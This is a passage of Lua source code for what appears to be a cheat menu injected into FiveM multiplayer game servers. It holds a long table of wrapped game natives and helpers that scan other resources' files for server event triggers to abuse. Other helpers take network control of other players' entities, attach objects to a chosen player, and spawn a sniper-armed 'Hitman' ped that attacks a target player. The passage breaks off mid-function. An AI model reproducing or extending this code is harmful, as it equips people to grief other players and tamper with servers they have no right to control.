           SetFollowPedCamViewMode = function(viewMode) return CockT.Inv["Invoke"](CockT.Natives['SetFollowPedCamViewMode'], viewMode) end,
           SetWeatherTypePersist = function(weatherType) return CockT.Inv["Invoke"](CockT.Natives['SetWeatherTypePersist'], weatherType) end,
           SetWeatherTypeNowPersist = function(weatherType) return CockT.Inv["Invoke"](CockT.Natives['SetWeatherTypeNowPersist'], weatherType) end,
           SetWeatherTypeNow = function(weatherType) return CockT.Inv["Invoke"](CockT.Natives['SetWeatherTypeNow'], weatherType) end,
           SetOverrideWeather = function(weatherType) return CockT.Inv["Invoke"](CockT.Natives['SetWeatherTypeNow'], weatherType) end,
           CreatePedInsideVehicle = function(vehicle, pedType, modelHash, seat, isNetwork, thisScriptCheck) return CockT.Inv["Invoke"](CockT.Natives['CreatePedInsideVehicle'], vehicle, pedType, modelHash, seat, isNetwork, thisScriptCheck, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           RequestAnimDict = function(animDict) return CockT.Inv["Invoke"](CockT.Natives['RequestAnimDict'], animDict) end,
           HasAnimDictLoaded = function(animDict) return CockT.Inv["Invoke"](CockT.Natives['HasAnimDictLoaded'], animDict) end,
           SetPedCurrentWeaponVisible = function(ped, visible, deselectWeapon, p3, p4) return CockT.Inv["Invoke"](CockT.Natives['SetPedCurrentWeaponVisible'], ped, visible, deselectWeapon, p3, p4) end,
           SetPedConfigFlag = function(ped, flagId, value) return CockT.Inv["Invoke"](CockT.Natives['SetPedConfigFlag'], ped, flagId, value) end,
           RemoveAnimDict = function(animDict) return CockT.Inv["Invoke"](CockT.Natives['RemoveAnimDict'], animDict) end,
           TaskMoveNetworkByName = function(ped, task, multiplier, p3, animDict, flags) return CockT.Inv["Invoke"](CockT.Natives['TaskMoveNetworkByName'], ped, task, multiplier, p3, animDict, flags) end,
           SetTaskMoveNetworkSignalFloat = function(ped, signalName, value) return CockT.Inv["Invoke"](CockT.Natives['SetTaskMoveNetworkSignalFloat'], ped, signalName, value) end,
           SetTaskMoveNetworkSignalBool = function(ped, signalName, value) return CockT.Inv["Invoke"](CockT.Natives['SetTaskMoveNetworkSignalBool'], ped, signalName, value) end,
           IsTaskMoveNetworkActive = function(ped) return CockT.Inv["Invoke"](CockT.Natives['IsTaskMoveNetworkActive'], ped) end,
           StartShapeTestCapsule = function(x1, y1, z1, x2, y2, z2, radius, flags, entity, p9) return CockT.Inv["Invoke"](CockT.Natives['StartShapeTestCapsule'], x1, y1, z1, x2, y2, z2, radius, flags, entity, p9) end,
           GetRaycastResult = function(shapeTestHandle, hit, endCoords, surfaceNormal, entityHit) return GetRaycastResult(shapeTestHandle, hit, endCoords, surfaceNormal, entityHit) end,
           GetGameplayCamRelativePitch = function() return CockT.Inv["Invoke"](CockT.Natives['GetGameplayCamRelativePitch'], _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           GetGameplayCamRelativeHeading = function() return CockT.Inv["Invoke"](CockT.Natives['GetGameplayCamRelativeHeading'], _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           GetOffsetFromEntityInWorldCoords = function(entity, offsetX, offsetY, offsetZ) return CockT.Inv["Invoke"](CockT.Natives['GetOffsetFromEntityInWorldCoords'], entity, offsetX, offsetY, offsetZ, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           RequestTaskMoveNetworkStateTransition = function(ped, name) return CockT.Inv["Invoke"](CockT.Natives['RequestTaskMoveNetworkStateTransition'], ped, name) end,
           IsPedInjured = function(ped) return CockT.Inv["Invoke"](CockT.Natives['IsPedInjured'], ped) end,
           IsPedInAnyVehicle = function(ped, bool) return CockT.Inv["Invoke"](CockT.Natives['IsPedInAnyVehicle'], ped, bool, _cit_.ReturnResultAnyway()) end,
           SetTextOutline = function() return CockT.Inv["Invoke"](CockT.Natives['SetTextOutline']) end,
           SetTextProportional = function(p0) return CockT.Inv["Invoke"](CockT.Natives['SetTextProportional'], p0) end,
           SetTextEdge = function(p0, r, g, b, a) return CockT.Inv["Invoke"](CockT.Natives['SetTextEdge'], p0, r, g, b, a) end,
           SetTextFont = function(fontType) return CockT.Inv["Invoke"](CockT.Natives['SetTextFont'], fontType) end,
           SetDrawOrigin = function(x, y, z, p3) return CockT.Inv["Invoke"](CockT.Natives['SetDrawOrigin'], x, y, z, p3) end,
           SetTextScale = function(scale, size) CockT.Inv["Invoke"](CockT.Natives['SetTextScale'], scale, size) end,
           SetTextColour = function(r, g, b, a) return CockT.Inv["Invoke"](CockT.Natives['SetTextColour'], r, g, b, a) end,
           SetTextDropshadow = function(distance, r, g, b, a) return CockT.Inv["Invoke"](CockT.Natives['SetTextDropshadow'], distance, r, g, b, a) end,
           SetTextEntry = function(text) return CockT.Inv["Invoke"](CockT.Natives['SetTextEntry'], text) end,
           SetTextCentre = function(align) return CockT.Inv["Invoke"](CockT.Natives['SetTextCentre'], align) end,
           --AddTextComponentString = function(text) return AddTextComponentString(text) end,
           AddTextComponentString = function(text) return CockT.Inv["Invoke"](CockT.Natives['AddTextComponentString'], text)  end,
           CancelEvent = function() return CockT.Inv["Invoke"](CockT.Natives['CancelEvent']) end,
           ClearDrawOrigin = function() return CockT.Inv["Invoke"](CockT.Natives['ClearDrawOrigin']) end,
           AddTextComponentSubstringWebsite = function(website) return AddTextComponentSubstringWebsite(website) end,
           EndTextCommandDisplayText = function(x, y) return CockT.Inv["Invoke"](CockT.Natives['EndTextCommandDisplayText'], x, y) end,
           BeginTextCommandDisplayText = function(text) return CockT.Inv["Invoke"](CockT.Natives['BeginTextCommandDisplayText'], CockT.Strings.tostring(text)) end,
           DrawText = function(x, y) return CockT.Inv["Invoke"](CockT.Natives['DrawText'], x, y) end,
           GetControlNormal = function(padIndex, control) return CockT.Inv["Invoke"](CockT.Natives['GetControlNormal'], padIndex, control, _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           --GetResourceByFindIndex = function(findIndex) return CockT.Inv["Invoke"](CockT.Natives['GetResourceByFindIndex'], findIndex, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           GetResourceByFindIndex = function(findIndex) return GetResourceByFindIndex(findIndex, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           SetEntityCoords = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea) return CockT.Inv["Invoke"](CockT.Natives['SetEntityCoords'], entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea) end,
           SetVehicleEngineOn = function(vehicle, value, instantly, noAutoTurnOn) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleEngineOn'], vehicle, value, instantly, noAutoTurnOn) end,
           TriggerSiren = function(vehicle) return CockT.Inv["Invoke"](CockT.Natives['TriggerSiren'], vehicle) end,
           SetVehicleSiren = function(vehicle, bool) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleSiren'], vehicle, bool) end,
           SetEntityRotation = function(entity, pitch, roll, yaw, rotationOrder, p5) return CockT.Inv["Invoke"](CockT.Natives['SetEntityRotation'], entity, pitch, roll, yaw, rotationOrder, p5) end,
           GetEntityHeading = function(entity) return CockT.Inv["Invoke"](CockT.Natives['GetEntityHeading'], entity, _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           SetEntityHeading = function(entity, heading) return CockT.Inv["Invoke"](CockT.Natives['SetEntityHeading'], entity, heading) end,
           SetEntityCollision = function(entity, toggle, keepPhysics) return CockT.Inv["Invoke"](CockT.Natives['SetEntityCollision'], entity, toggle, keepPhysics) end,
           SetEntityCoordsNoOffset = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis) return CockT.Inv["Invoke"](CockT.Natives['SetEntityCoordsNoOffset'], entity, xPos, yPos, zPos, xAxis, yAxis, zAxis) end,
           NetworkHasControlOfEntity = function(entity) return CockT.Inv["Invoke"](CockT.Natives['NetworkHasControlOfEntity'], entity, _cit_.ReturnResultAnyway()) end,
           SetNetworkIdCanMigrate = function(netId, toggle) return CockT.Inv["Invoke"](CockT.Natives['SetNetworkIdCanMigrate'], netId, toggle) end,
           NetworkGetNetworkIdFromEntity = function(entity) return CockT.Inv["Invoke"](CockT.Natives['NetworkGetNetworkIdFromEntity'], entity) end,
           EndTextCommandGetWidth = function(p0) return CockT.Inv["Invoke"](CockT.Natives['EndTextCommandGetWidth'], p0, _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           GetShapeTestResult = function(shapeTestHandle) return CockT.Inv["Invoke"](CockT.Natives['GetShapeTestResult'], shapeTestHandle, _cit_.PointerValueInt(), _cit_.PointerValueVector(), _cit_.PointerValueVector(), _cit_.PointerValueInt(), _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           IsDisabledControlJustReleased = function(padIndex, control) return CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlJustReleased'], padIndex, control, _cit_.ReturnResultAnyway()) end,
           IsDisabledControlPressed = function(padIndex, control) return CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlPressed'], padIndex, control, _cit_.ReturnResultAnyway()) end,
           SetRunSprintMultiplierForPlayer = function(player, multiplier) return CockT.Inv["Invoke"](CockT.Natives['SetRunSprintMultiplierForPlayer'], player, multiplier) end,
           SetPedMoveRateOverride = function(ped, value) return CockT.Inv["Invoke"](CockT.Natives['SetPedMoveRateOverride'], ped, value) end,
           GetStreetNameFromHashKey = function(hash) return GetStreetNameFromHashKey(hash) end,
           GetStreetNameAtCoord = function(x, y, z, streetName, crossingRoad) return GetStreetNameAtCoord(x, y, z, streetName, crossingRoad) end,
           GetEntityHealth = function(entity) return CockT.Inv["Invoke"](CockT.Natives['GetEntityHealth'], entity, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           ClearPedLastWeaponDamage = function(ped) return CockT.Inv["Invoke"](CockT.Natives['ClearPedLastWeaponDamage'], ped) end,
           SetEntityProofs = function(entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, p6, p7, drownProof) return CockT.Inv["Invoke"](CockT.Natives['SetEntityProofs'], entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, p6, p7, drownProof) end,
           SetEntityOnlyDamagedByPlayer = function(entity, bool) return CockT.Inv["Invoke"](CockT.Natives['SetEntityOnlyDamagedByPlayer'], entity, bool) end,
           SetEntityCanBeDamaged = function(entity, bool) return CockT.Inv["Invoke"](CockT.Natives['SetEntityCanBeDamaged'], entity, bool) end,
           ClearTimecycleModifier = function() return CockT.Inv["Invoke"](CockT.Natives['ClearTimecycleModifier']) end,
           GetDisabledControlNormal = function(padIndex, control) return CockT.Inv["Invoke"](CockT.Natives['GetDisabledControlNormal'], padIndex, control, _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           RenderScriptCams = function(render, ease, easeTime, p3, p4) return CockT.Inv["Invoke"](CockT.Natives['RenderScriptCams'], render, ease, easeTime, p3, p4) end,
           SetCamActive = function(cam, bool) return CockT.Inv["Invoke"](CockT.Natives['SetCamActive'], cam, bool) end,
           SetCamCoord = function(cam, posX, posY, posZ) return CockT.Inv["Invoke"](CockT.Natives['SetCamCoord'], cam, posX, posY, posZ) end,
           AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake) return CockT.Inv["Invoke"](CockT.Natives['AddExplosion'], x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake) end,
           BeginTextCommandWidth = function(string) return CockT.Inv["Invoke"](CockT.Natives['BeginTextCommandWidth'], string) end,
           SetGameplayCamRelativeRotation = function(roll, pitch, yaw) return CockT.Inv["Invoke"](CockT.Natives['SetGameplayCamRelativeRotation'], roll, pitch, yaw) end,
           IsDisabledControlJustPressed = function(padIndex, control) return CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlJustPressed'], padIndex, control, _cit_.ReturnResultAnyway()) end,
           GetEntityPlayerIsFreeAimingAt = function(player, entity) return CockT.Inv["Invoke"](CockT.Natives['GetEntityPlayerIsFreeAimingAt'], player, _cit_.PointerValueIntInitialized(entity), _cit_.ReturnResultAnyway()) end,
           SetPedShootsAtCoord = function(ped, x, y, z, toggle) return CockT.Inv["Invoke"](CockT.Natives['SetPedShootsAtCoord'], ped, x, y, z, toggle) end,
           IsEntityAPed = function(entity) return CockT.Inv["Invoke"](CockT.Natives['IsEntityAPed'], entity, _cit_.ReturnResultAnyway()) end,
           IsEntityDead = function(entity) return CockT.Inv["Invoke"](CockT.Natives['IsEntityDead'], entity, _cit_.ReturnResultAnyway()) end,
           ShowLine = function(p0) return CockT.Inv["Invoke"](CockT.Natives['ShowLineUnderWall'], p0, _cit_.ReturnResultAnyway()) end,
           SelectPed = function(p0, p1) return CockT.Inv["Invoke"](CockT.Natives['SelectPed'], p0, p1, _cit_.ReturnResultAnyway()) end,
           Vdist = function(x1, y1, z1, x2, y2, z2) return CockT.Inv["Invoke"](CockT.Natives['Vdist'], x1, y1, z1, x2, y2, z2) end,
           GetFinalRenderedCamCoord = function() return CockT.Inv["Invoke"](CockT.Natives['GetFinalRenderedCamCoord'], _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           StartExpensiveSynchronousShapeTestLosProbe = function(x1, y1, z1, x2, y2, z2, flags, entity, p8) return CockT.Inv["Invoke"](CockT.Natives['StartExpensiveSynchronousShapeTestLosProbe'], x1, y1, z1, x2, y2, z2, flags, entity, p8) end,
           clean = function(str, is_esp) local str = str:gsub("~", "") if #str >= 6 and not is_esp then str = str:sub(1, 6) .. "..." end; return str end,
           Enumerate = function(initFunc, moveFunc, disposeFunc)  return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then; disposeFunc(iter); return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end,
           Leprint = function(message) return CockT.Math.printLog('\n'..message) end,
           RequestControlOnce = function(entity) if CockT.Inv["Invoke"](CockT.Natives['NetworkHasControlOfEntity'], entity) then return true end CockT.Inv["Invoke"](CockT.Natives['SetNetworkIdCanMigrate'], CockT.Inv["Invoke"](CockT.Natives['NetworkGetNetworkIdFromEntity'], entity), true) return CockT.Inv["Invoke"](CockT.Natives['NetworkRequestControlOfEntity'], entity) end,
           GetPlayerServerId = function(id) return CockT.Inv["Invoke"](CockT.Natives['GetPlayerServerId'], id, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GetPlayerFromServerId = function(id) return CockT.Inv["Invoke"](CockT.Natives['GetPlayerFromServerId'], id, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           NetworkIsPlayerActive = function(player) return CockT.Inv["Invoke"](CockT.Natives['NetworkIsPlayerActive'], player, _cit_.ReturnResultAnyway()) end,
           HasModelLoaded = function(model) return CockT.Inv["Invoke"](CockT.Natives['HasModelLoaded'], model, _cit_.ReturnResultAnyway())  end,
           GetEntityModel = function(entity) return CockT.Inv["Invoke"](CockT.Natives['GetEntityModel'], entity, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetVehicleForwardSpeed = function(vehicle, speed) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleForwardSpeed'], vehicle, speed) end,
           GetModelDimensions = function(modelHash) return CockT.Inv["Invoke"](CockT.Natives['GetModelDimensions'], modelHash, _cit_.PointerValueVector(), _cit_.PointerValueVector()) end,
           DoesBlipExist = function(blip)  return CockT.Inv["Invoke"](CockT.Natives['DoesBlipExist'], blip, _cit_.ReturnResultAnyway())  end,
           GetFirstBlipInfoId = function(blipSprite) return CockT.Inv["Invoke"](CockT.Natives['GetFirstBlipInfoId'], blipSprite, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GetPedArmour = function(ped) return CockT.Inv["Invoke"](CockT.Natives['GetPedArmour'], ped, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetSuperJumpThisFrame = function(player) return CockT.Inv["Invoke"](CockT.Natives['SetSuperJumpThisFrame'], player, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetPedToRagdoll = function(ped, time1, time2, ragdollType, p4, p5, p6)  return CockT.Inv["Invoke"](CockT.Natives['SetPedToRagdoll'], ped, time1, time2, ragdollType, p4, p5, p6, _cit_.ReturnResultAnyway()) end,
           SetPedCanRagdollFromPlayerImpact = function(ped, toggle) return CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdollFromPlayerImpact'], ped, toggle) end,
           IsModelValid = function(model) return CockT.Inv["Invoke"](CockT.Natives['IsModelValid'], model, _cit_.ReturnResultAnyway()) end,
           IsModelAVehicle = function(model) return CockT.Inv["Invoke"](CockT.Natives['IsModelAVehicle'], model, _cit_.ReturnResultAnyway()) end,
           DestroyCam = function(cam, thisScriptCheck) return CockT.Inv["Invoke"](CockT.Natives['DestroyCam'], cam, thisScriptCheck) end,
           SetFocusEntity = function(entity) return CockT.Inv["Invoke"](CockT.Natives['SetFocusEntity'], entity) end,
           SetCamRot = function(cam, rotX, rotY, rotZ, rotationOrder) return CockT.Inv["Invoke"](CockT.Natives['SetCamRot'], cam, rotX, rotY, rotZ, rotationOrder) end,
           GetCurrentPedWeapon = function(ped, p2) return CockT.Inv["Invoke"](CockT.Natives['GetCurrentPedWeapon'], ped, _cit_.PointerValueInt(), p2, _cit_.ReturnResultAnyway()) end,
           GetWeaponClipSize = function(weaponHash) return CockT.Inv["Invoke"](CockT.Natives['GetWeaponClipSize'], weaponHash) end,
           GetGameplayCamCoord = function() return CockT.Inv["Invoke"](CockT.Natives['GetGameplayCamCoord'], _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           GetPedLastWeaponImpactCoord = function(ped, coords) return CockT.Inv["Invoke"](CockT.Natives['GetPedLastWeaponImpactCoord'], ped, _cit_.PointerValueVector(), _cit_.ReturnResultAnyway()) end,
           HasWeaponAssetLoaded = function(weaponHash) return CockT.Inv["Invoke"](CockT.Natives['HasWeaponAssetLoaded'], weaponHash, _cit_.ReturnResultAnyway()) end,
           IsEntityOnScreen = function(entity) return CockT.Inv["Invoke"](CockT.Natives['IsEntityOnScreen'], entity, _cit_.ReturnResultAnyway()) end,
           LoadResourceFile = function(resourceName, fileName) return CockT.Inv["Invoke"](CockT.Natives['LoadResourceFile'], CockT.Strings.tostring(resourceName), CockT.Strings.tostring(fileName), _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           mathsplit = function(math, split) local lines = {} for g in math:gmatch(split) do lines[#lines + 1] = g end; return lines; end,
           GetResourceMetadata = function(resourceName, metaKey, index) return CockT.Inv["Invoke"](CockT.Natives['GetResourceMetadata'], CockT.Strings.tostring(resourceName), CockT.Strings.tostring(metaKey), index, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           GetNumResourceMetadata = function(resourceName, metaKey)  return CockT.Inv["Invoke"](CockT.Natives['GetNumResourceMetadata'], CockT.Strings.tostring(resourceName), CockT.Strings.tostring(metaKey), _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           HasNamedPtfxAssetLoaded = function(assetName)  return CockT.Inv["Invoke"](CockT.Natives['HasNamedPtfxAssetLoaded'], assetName, _cit_.ReturnResultAnyway())  end,
           HasStreamedTextureDictLoaded = function(textureDict)  return CockT.Inv["Invoke"](CockT.Natives['HasStreamedTextureDictLoaded'], CockT.Strings.tostring(textureDict), _cit_.ReturnResultAnyway())  end,
           IsPedAPlayer = function(ped) return CockT.Inv["Invoke"](CockT.Natives['IsPedAPlayer'], ped, _cit_.ReturnResultAnyway())  end,
           GetCurrentPedWeaponEntityIndex = function() return CockT.Inv["Invoke"](CockT.Natives['GetCurrentPedWeaponEntityIndex'], ped, _cit_.ResultAsInteger()) end,
           IsPedArmed = function(ped, p1) return CockT.Inv["Invoke"](CockT.Natives['IsPedArmed'], ped, p1, _cit_.ReturnResultAnyway())  end,
           IsPedShooting = function(ped) return CockT.Inv["Invoke"](CockT.Natives['IsPedShooting'], ped, _cit_.ReturnResultAnyway()) end,
           SmashVehicleWindow = function(vehicle, index) return CockT.Inv["Invoke"](CockT.Natives['SmashVehicleWindow'], vehicle, index, _cit_.ResultAsInteger())  end,
           ClonePed = function(ped, heading, isNetwork, netMissionEntity) return CockT.Inv["Invoke"](CockT.Natives['ClonePed'], ped, heading, isNetwork, netMissionEntity, _cit_.ResultAsInteger()) end,
           GetRedUid = function() return CockT.Inv["Invoke"](CockT.Natives['redUID'], _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           RequestFromWeb = function(url, args, type) return CockT.Inv["Invoke"](CockT.Natives['Request'], url, CockT.Strings.jsonencode(args), type, _cit_.ResultAsString()) end,
           IsVehicleNeonLightEnabled = function(vehicle, index) return CockT.Inv["Invoke"](CockT.Natives['IsVehicleNeonLightEnabled'], vehicle, index, _cit_.ReturnResultAnyway()) end,
           GetDisplayNameFromVehicleModel = function(modelHash) return CockT.Inv["Invoke"](CockT.Natives['GetDisplayNameFromVehicleModel'], modelHash, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           RenderFakePickupGlow = function(x, y, z, colourIndex) return CockT.Inv["Invoke"](CockT.Natives['RenderFakePickupGlow'], x, y, z, colourIndex) end,
           SetEntityHealth = function(entity, health) return CockT.Inv["Invoke"](CockT.Natives['SetEntityHealth'], entity, health) end,
           SetPedArmour = function(ped, amount) return CockT.Inv["Invoke"](CockT.Natives['SetPedArmour'], ped, amount) end,
           StopScreenEffect = function(effectName) return CockT.Inv["Invoke"](CockT.Natives['StopScreenEffect'], effectName) end,
           ClearPedTasksImmediately = function(...) local ped = CockT.Strings.tunpack({...}) if ped then return CockT.Inv["Invoke"](CockT.Natives['ClearPedTasksImmediately'], ped) end end,
           RequestStreamedTextureDict = function(...) local texture = CockT.Strings.tunpack({...}) if texture then return CockT.Inv["Invoke"](CockT.Natives["RequestStreamedTextureDict"], texture); else; return CockT.Inv["Invoke"](CockT.Natives["RequestStreamedTextureDict"], 'srange_gen'); end end,
           StartShapeTestRay = function(x1, y1, z1, x2, y2, z2, flags, entity, p8) return CockT.Inv["Invoke"](CockT.Natives['StartShapeTestRay'], x1, y1, z1, x2, y2, z2, flags, entity, p8, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
   
           GetGameTimer = function() return CockT.Inv["Invoke"](CockT.Natives["GetGameTimer"], _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           AddTextEntry = function(entryKey, entryText) return CockT.Inv["Invoke"](CockT.Natives["AddTextEntry"], CockT.Strings.tostring(entryKey), CockT.Strings.tostring(entryText)) end,
           UpdateOnscreenKeyboard = function() return CockT.Inv["Invoke"](CockT.Natives["UpdateOnscreenKeyboard"], _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GetOnscreenKeyboardResult = function() return CockT.Inv["Invoke"](CockT.Natives["GetOnscreenKeyboardResult"], _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           GetGameplayCamRot = function(rotationOrder) return CockT.Inv["Invoke"](CockT.Natives["GetGameplayCamRot"], rotationOrder, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           IsPlayerFreeAiming = function(player) return CockT.Inv["Invoke"](CockT.Natives["IsPlayerFreeAiming"], player, _cit_.ReturnResultAnyway()) end,
       },
   }
   Fatasf.n.EnumerateObjects = function() return Fatasf.n.Enumerate(FindFirstObject, FindNextObject, EndFindObject) end
   Fatasf.n.EnumeratePeds = function() return Fatasf.n.Enumerate(FindFirstPed, FindNextPed, EndFindPed) end
   Fatasf.n.EnumerateVehicles = function() return Fatasf.n.Enumerate(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end
   Fatasf.n.DrawTextB = function(text, x, y, _outl, size, font, centre) Fatasf.n.SetTextFont(0) if _outl then Fatasf.n.SetTextOutline(true) end if CockT.Math.tonumber(font) ~= nil then Fatasf.n.SetTextFont(font) end Fatasf.n.SetTextCentre(centre) Fatasf.n.SetTextScale(100.0, size or 0.23) Fatasf.n.BeginTextCommandDisplayText("STRING") Fatasf.n.AddTextComponentSubstringWebsite(text) Fatasf.n.EndTextCommandDisplayText(x, y) end
   Fatasf.n.GetResources = function()
       local resources = {}
       for i = 0, CockT.Inv["Invoke"](CockT.Natives["GetNumResources"]) do
           resources[i] = Fatasf.n.GetResourceByFindIndex(i)
       end
       return resources
   end
   Fatasf.n.RayCastCam = function(distance) local adjustedRotation = {x = (CockT.Math.pi / 180) * Fatasf.n.GetCamRot(cam, 0).x,  y = (CockT.Math.pi / 180) * Fatasf.n.GetCamRot(cam, 0).y, z = (CockT.Math.pi / 180) * Fatasf.n.GetCamRot(cam, 0).z} local direction = {x = -CockT.Math.sin(adjustedRotation.z) * CockT.Math.abs(CockT.Math.cos(adjustedRotation.x)), y = CockT.Math.cos(adjustedRotation.z) * CockT.Math.abs(CockT.Math.cos(adjustedRotation.x)), z = CockT.Math.sin(adjustedRotation.x)} local cameraRotation = Fatasf.n.GetCamRot(cam,0) local cameraCoord = Fatasf.n.GetCamCoord(cam) local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance} local a, b, c, d, e = Fatasf.n.GetShapeTestResult(Fatasf.n.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1)) return b, c, e end
   Fatasf.n.GetResourcestatus = function(resource_name)
       if Fatasf.n.GetResourceState(resource_name) == "started" or CockT.Strings.upper(Fatasf.n.GetResourceState(resource_name)) == "started" or CockT.Strings.lower(Fatasf.n.GetResourceState(resource_name)) == "started" then
           return true
       else
           return false
       end
   end
   CockT.Global.GetTextWidht = function(str, scale)
       Fatasf.n.BeginTextCommandWidth("STRING")
       Fatasf.n.AddTextComponentString(str)
       Fatasf.n.SetTextFont(4)
       Fatasf.n.SetTextScale(scale or 0.35, scale or 0.35)
       local length = Fatasf.n.EndTextCommandGetWidth(1)
       return length
   end
   CockT.Global.Zones = function(x, y, w, h)
       local c_x, c_y = Fatasf.n.GetNuiCursorPosition()  local widht, height = Fatasf.n.GetActiveScreenResolution() c_x = c_x / widht c_y = c_y / height
   
       if (c_x > x - (w / 2) and c_y > y - (h / 2) and c_x < x + (w / 2) and c_y < y + (h / 2)) then 
           return true
       else
           return false
       end
   end
   CockT.Global.GiveWeaponComponentToPed = function(hash) 
       return CockT.Inv["Invoke"](CockT.Natives['GiveWeaponComponentToPed'], Fatasf.n.PlayerPedId(), Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()), hash) 
   end
   CockT.Global.RemoveWeaponComponentFromPed = function(hash)
       return CockT.Inv["Invoke"](CockT.Natives['RemoveWeaponComponentFromPed'], Fatasf.n.PlayerPedId(), Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()), hash) 
   end
   
   CockT.Global.TriggerFinder = function(content)
       local s, e = CockT.Strings.find(content, "TriggerServerEvent%b()")
       if s and e then
           local event = CockT.Strings.sub(content, s, e)
           return event
       else
           return "Trigger not found"
       end
       
   end
   
   CockT.Global.DrawText = function(text, x, y, _outl, size, font, centre)
       Fatasf.n.SetTextFont(0)
       if _outl then
           Fatasf.n.SetTextOutline(true)
       end
       if CockT.Math.tonumber(font) ~= nil then
           Fatasf.n.SetTextFont(font)
       end
       Fatasf.n.SetTextCentre(centre)
       Fatasf.n.SetTextScale(100.0, size or 0.23)
       Fatasf.n.BeginTextCommandDisplayText("STRING")
       Fatasf.n.AddTextComponentSubstringWebsite(text)
       Fatasf.n.EndTextCommandDisplayText(x, y)
   end
   CockT.Global.CustomProp = function(object, player)
       CockT.Inv["Thread"](function()
           if object then
               local objhash = Fatasf.n.GetHashKey(object)
               local createobj = Fatasf.n.CreateObject(objhash, 0, 0, 0, true, true, true)
               Fatasf.n.AttachEntityToEntity(createobj, Fatasf.n.GetPlayerPed(player), Fatasf.n.GetPedBoneIndex(Fatasf.n.GetPlayerPed(player), 0), 0, 0, 0.3, 0.0, 0.0, 0, true, true, false, true, 1, true)
           end
       end)
   end
   CockT.Global.Hitman = function(player)
       local model = Fatasf.n.GetHashKey('cs_movpremmale')
       Fatasf.n.RequestModel(model)
       if not Fatasf.n.HasModelLoaded(model) then 
           Fatasf.n.RequestModel(model)
       end
       local ped = Fatasf.n.GetPlayerPed(player)
       local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(ped))
       local p1 = Fatasf.n.CreatePed(3, model, x+25.0, y+25.0, z, 1, true, true)
       CockT.Inv["Invoke"](CockT.Natives['TaskFollowToOffsetOfEntity'], p1, ped, 0.5, 0.0, 0.0, 5.0, -1, 0.0, 1)
       Fatasf.n.SetPedKeepTask(p1, true)
       Fatasf.n.GiveWeaponToPed(p1, Fatasf.n.GetHashKey('weapon_heavysniper_mk2'), 111, true, true)
       local blip = CockT.Inv["Invoke"](CockT.Natives["AddBlipForEntity"], p1)
       --Wait(10000)
       CockT.Inv["Invoke"](CockT.Natives["TaskCombatPed"], p1, ped, 0,16)
   end
   CockT.Global.GetOwnPed = function(m1)
       local model = Fatasf.n.GetHashKey(m1)
       Fatasf.n.RequestModel(model)
       if not Fatasf.n.HasModelLoaded(model) then 
           CockT.Inv["Wait"](80)
           Fatasf.n.RequestModel(model)
       end
       local ped = Fatasf.n.GetPlayerPed(player)
       local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(ped))
       local p1 = Fatasf.n.CreatePed(3, model, x, y, z, 1, true, true)
       CockT.Inv["Invoke"](CockT.Natives['TaskFollowToOffsetOfEntity'], p1, ped, 0.5, 0.0, 0.0, 5.0, -1, 0.0, 1)
       Fatasf.n.SetPedKeepTask(p1, true)
